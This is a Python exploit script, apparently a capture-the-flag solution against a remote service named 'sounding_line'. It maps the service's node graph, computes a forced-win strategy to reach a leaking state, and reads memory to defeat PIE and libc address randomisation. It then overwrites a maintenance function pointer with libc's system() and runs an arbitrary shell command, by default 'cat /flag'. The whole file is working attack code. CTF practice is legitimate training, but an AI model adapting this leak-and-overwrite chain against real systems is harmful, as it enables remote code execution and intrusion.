import socket
import sys
import re
import time
import subprocess

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
BIN = sys.argv[3] if len(sys.argv) > 3 else "sounding_line"
LIBC = sys.argv[4] if len(sys.argv) > 4 else None
MAINT_CMD = sys.argv[5] if len(sys.argv) > 5 else "cat /flag"

NODES = 48
S_STAR = 31
SINKS = [6, 19, 31, 43]
GLYPHS = "MNBVCXZLKJHGFDSAPOIUYTREW"
WKEY = 0x9E3779B97F4A7C15
PIE_SLOT = 3
LIBC_SLOT = 10
ROV0 = 0
REG0 = 23
OFF_BANNER = 0x1810
OFF_MAINT = 0x6040


def readelf_sym(path, name):
    out = subprocess.check_output(["readelf", "-sW", path], text=True)
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 8 and parts[7].split("@")[0] == name:
            return int(parts[1], 16)
    raise KeyError(name)


def libc_path_for(binary):
    out = subprocess.check_output(["ldd", binary], text=True)
    for line in out.splitlines():
        if "libc.so" in line:
            m = re.search(r"=>\s*(\S+)", line)
            if m:
                return m.group(1)
            return line.split()[0]
    raise RuntimeError("libc not found")


class Chan:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=5)
        self.buf = b""

    def drain(self, idle=0.25, total=3.0):
        self.s.setblocking(False)
        end = time.time() + total
        last = time.time()
        while time.time() < end:
            try:
                d = self.s.recv(4096)
                if d:
                    self.buf += d
                    last = time.time()
                else:
                    break
            except BlockingIOError:
                if time.time() - last > idle:
                    break
                time.sleep(0.02)
        out = self.buf
        self.buf = b""
        return out.decode(errors="replace")

    def cmd(self, line, idle=0.25, total=3.0):
        self.s.setblocking(True)
        self.s.sendall(line.encode() + b"\n")
        return self.drain(idle, total)

    def cmd_re(self, line, pattern, total=3.0):
        self.s.setblocking(True)
        self.s.sendall(line.encode() + b"\n")
        end = time.time() + total
        self.s.setblocking(False)
        rx = re.compile(pattern)
        while time.time() < end:
            if rx.search(self.buf.decode(errors="replace")):
                break
            try:
                d = self.s.recv(4096)
                if d:
                    self.buf += d
                else:
                    time.sleep(0.02)
            except BlockingIOError:
                time.sleep(0.02)
        out = self.buf
        self.buf = b""
        return out.decode(errors="replace")


def moves(adj, u):
    return adj[u] + [u]


def attractor(adj, targets):
    tset = set(targets)
    W = [[False] * NODES for _ in range(NODES)]
    changed = True
    while changed:
        changed = False
        for r in range(NODES):
            mr = moves(adj, r)
            for c in range(NODES):
                if r == c or W[r][c]:
                    continue
                regm = moves(adj, c)
                regset = set(regm)
                won = False
                for rp in mr:
                    if rp == c or rp in regset:
                        continue
                    if rp in tset:
                        won = True
                        break
                    if all(W[rp][cp] for cp in regm):
                        won = True
                        break
                if won:
                    W[r][c] = True
                    changed = True
    return W


def pick_move(adj, W, tset, r, c):
    regm = moves(adj, c)
    regset = set(regm)
    for rp in moves(adj, r):
        if rp == c or rp in regset:
            continue
        if rp in tset:
            return rp
        if all(W[rp][cp] for cp in regm):
            return rp
    return None


def encode_addr(target):
    v = target ^ WKEY
    digits = []
    for _ in range(14):
        digits.append(v % 25)
        v //= 25
    digits = digits[::-1]
    return "".join(GLYPHS[d] for d in digits)


def main():
    ch = Chan(HOST, PORT)
    print(ch.drain())

    adj = [[] for _ in range(NODES)]
    for n in range(NODES):
        r = ch.cmd_re("survey %d" % n, r"bulkheads to:[ \d]*\n", total=3.0)
        m = re.search(r"bulkheads to:([ \d]+)", r)
        adj[n] = [int(x) for x in m.group(1).split()] if m else []
    print("[*] surveyed manifold, degrees:", [len(a) for a in adj][:8], "...")

    W = attractor(adj, [S_STAR])
    if not W[ROV0][REG0]:
        print("[!] no forced win to S* from start")
        return
    print("[*] retrograde tablebase says start is a forced win to sink", S_STAR)

    print(ch.cmd("dive"))
    r, c = ROV0, REG0
    cache = None
    for _ in range(40):
        rp = pick_move(adj, W, {S_STAR}, r, c)
        if rp is None:
            print("[!] strategy stuck at", r, c)
            return
        resp = ch.cmd("valve %d" % rp, idle=0.1, total=1.5)
        r = rp
        mreg = re.search(r"regulator at (\d+)", resp)
        if mreg:
            c = int(mreg.group(1))
        mcache = re.search(r"survey datum staged at 0x([0-9a-fA-F]+)", resp)
        if mcache:
            cache = int(mcache.group(1), 16)
            print("[*] equalized at sink", r, "cache @", hex(cache))
            break
        if "crushed" in resp:
            print("[!] caught:", resp)
            return
    if cache is None:
        print("[!] never equalized")
        return

    def read_slot(slot):
        addr = cache + slot * 8
        ch.cmd("mark %s" % encode_addr(addr), idle=0.05, total=1.0)
        resp = ch.cmd("ping", idle=0.1, total=1.5)
        m = re.search(r"chart cache holds 0x([0-9a-fA-F]+)", resp)
        if not m:
            raise RuntimeError("ping failed: " + resp)
        return int(m.group(1), 16)

    pie_ref = read_slot(PIE_SLOT)
    libc_ref = read_slot(LIBC_SLOT)
    print("[*] pie_ref  =", hex(pie_ref))
    print("[*] libc_ref =", hex(libc_ref))

    try:
        off_banner = readelf_sym(BIN, "render_banner")
        off_maint = readelf_sym(BIN, "maintenance_fn")
    except KeyError:
        off_banner = OFF_BANNER
        off_maint = OFF_MAINT
    pie_base = pie_ref - off_banner
    maint_addr = pie_base + off_maint
    print("[*] pie_base =", hex(pie_base), "maintenance_fn @", hex(maint_addr))

    libc = LIBC or libc_path_for(BIN)
    off_puts = readelf_sym(libc, "puts")
    off_system = readelf_sym(libc, "system")
    libc_base = libc_ref - off_puts
    system_addr = libc_base + off_system
    print("[*] libc      =", libc)
    print("[*] libc_base =", hex(libc_base), "system @", hex(system_addr))

    ch.cmd("mark %s" % encode_addr(maint_addr), idle=0.05, total=1.0)
    print(ch.cmd("set %x" % system_addr, idle=0.1, total=1.5))
    resp = ch.cmd("maintenance %s; echo ---END---" % MAINT_CMD, idle=0.3, total=4.0)
    print("[server]\n" + resp)
    m = re.search(r"H7CTF\{[^}]*\}", resp)
    if m:
        print("RECOVERED_FLAG:", m.group(0))
    else:
        print("[!] flag not seen")


if __name__ == "__main__":
    main()
